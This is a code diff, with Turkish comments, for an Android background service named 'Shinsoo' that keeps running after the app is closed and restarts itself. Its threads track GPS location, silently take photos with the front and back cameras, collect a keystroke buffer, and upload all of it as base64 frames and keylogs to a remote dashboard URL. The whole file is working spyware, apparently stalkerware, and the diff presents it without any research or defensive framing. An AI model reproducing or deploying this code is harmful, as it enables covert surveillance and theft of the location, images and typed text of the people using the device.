@@ -1,7 +1,6 @@
 """
-service/monitor.py
-Shinsoo arka plan servisi.
-Uygulama tamamen kapatilsa bile bildirimde "Shinsoo" ile calisir.
+service/monitor.py - Shinsoo Arka Plan Servisi
+Uygulama kapatilsa bile bildirimde "Shinsoo" ile calisir.
 """
 import time, uuid, base64, io, threading
 from datetime import datetime
@@ -16,9 +15,9 @@ def make_device_id():
 
 DEVICE_ID = make_device_id()
 running   = [True]
-last_loc  = [None]
 front_q   = [None]
 back_q    = [None]
+last_loc  = [None]
 key_buf   = []
 key_lock  = threading.Lock()
 
@@ -26,9 +25,10 @@ key_lock  = threading.Lock()
 def gps_loop():
     try:
         from jnius import autoclass, PythonJavaClass, java_method
-        LocationManager = autoclass('android.location.LocationManager')
         PythonService   = autoclass('org.kivy.android.PythonService')
-        context         = PythonService.mService
+        LocationManager = autoclass('android.location.LocationManager')
+        ctx = PythonService.mService
+        lm  = ctx.getSystemService('location')
 
         class LL(PythonJavaClass):
             __javainterfaces__ = ['android/location/LocationListener']
@@ -40,7 +40,6 @@ def gps_loop():
             @java_method('(Ljava/lang/String;)V')
             def onProviderDisabled(self, p): pass
 
-        lm = context.getSystemService('location')
         ll = LL()
         for p in ['gps', 'network', 'passive']:
             try: lm.requestLocationUpdates(p, 2000, 0, ll)
@@ -58,7 +57,7 @@ def gps_loop():
         pass
 
 
-def camera_loop():
+def cam_loop():
     try:
         from jnius import autoclass, PythonJavaClass, java_method
         Camera = autoclass('android.hardware.Camera')
@@ -72,16 +71,15 @@ def camera_loop():
             try:
                 result = [None]
                 done   = threading.Event()
-
-                cam = Camera.open(idx)
+                cam    = Camera.open(idx)
                 params = cam.getParameters()
                 params.setPictureSize(320, 240)
                 cam.setParameters(params)
                 ST = autoclass('android.graphics.SurfaceTexture')
-                st = ST(idx + 50)
+                st = ST(idx + 60)
                 cam.setPreviewTexture(st)
                 cam.startPreview()
-                time.sleep(0.15)
+                time.sleep(0.2)
 
                 class PicCB(PythonJavaClass):
                     __javainterfaces__ = ['android/hardware/Camera$PictureCallback']
@@ -98,27 +96,25 @@ def camera_loop():
                     b64 = base64.b64encode(result[0]).decode('utf-8')
                     if idx == 0: back_q[0]  = b64
                     else:        front_q[0] = b64
-
             except Exception:
-                time.sleep(0.5)
-
-        time.sleep(0.1)  # 10 fps hedef
+                time.sleep(0.3)
+        time.sleep(0.1)
 
 
 def key_loop():
     try:
         from jnius import autoclass
         PythonService = autoclass('org.kivy.android.PythonService')
-        context       = PythonService.mService
+        ctx = PythonService.mService
         while running[0]:
             try:
-                prefs = context.getSharedPreferences('shinsoo_keys', 0)
+                prefs = ctx.getSharedPreferences('shinsoo_keys', 0)
                 buf   = prefs.getString('buffer', '')
                 if buf:
                     with key_lock: key_buf.append(buf)
                     prefs.edit().putString('buffer', '').apply()
             except Exception: pass
-            time.sleep(0.5)
+            time.sleep(0.3)
     except Exception:
         pass
 
@@ -129,9 +125,10 @@ def send_loop():
     except Exception:
         return
     url = DASHBOARD_URL + '/upload_data/' + DEVICE_ID
+    count = 0
     while running[0]:
         try:
-            payload = {'log': 'BG heartbeat ' + datetime.now().strftime('%H:%M:%S')}
+            payload = {'log': 'BG ' + datetime.now().strftime('%H:%M:%S')}
             f = front_q[0]; b = back_q[0]
             if f: payload['frame_front'] = f; front_q[0] = None
             if b: payload['frame_back']  = b; back_q[0]  = None
@@ -142,6 +139,7 @@ def send_loop():
                     payload['keylog'] = ' '.join(key_buf)
                     key_buf.clear()
             requests.post(url, json=payload, timeout=3)
+            count += 1
         except Exception:
             pass
         time.sleep(0.1)
@@ -150,15 +148,15 @@ def send_loop():
 if __name__ == '__main__':
     try:
         from jnius import autoclass
-        PythonService = autoclass('org.kivy.android.PythonService')
-        PythonService.mService.setAutoRestartService(True)
+        PS = autoclass('org.kivy.android.PythonService')
+        PS.mService.setAutoRestartService(True)
     except Exception:
         pass
 
-    threading.Thread(target=gps_loop,    daemon=True).start()
-    threading.Thread(target=camera_loop, daemon=True).start()
-    threading.Thread(target=key_loop,    daemon=True).start()
-    threading.Thread(target=send_loop,   daemon=True).start()
+    threading.Thread(target=gps_loop,  daemon=True).start()
+    threading.Thread(target=cam_loop,  daemon=True).start()
+    threading.Thread(target=key_loop,  daemon=True).start()
+    threading.Thread(target=send_loop, daemon=True).start()
 
     while True:
         time.sleep(10)
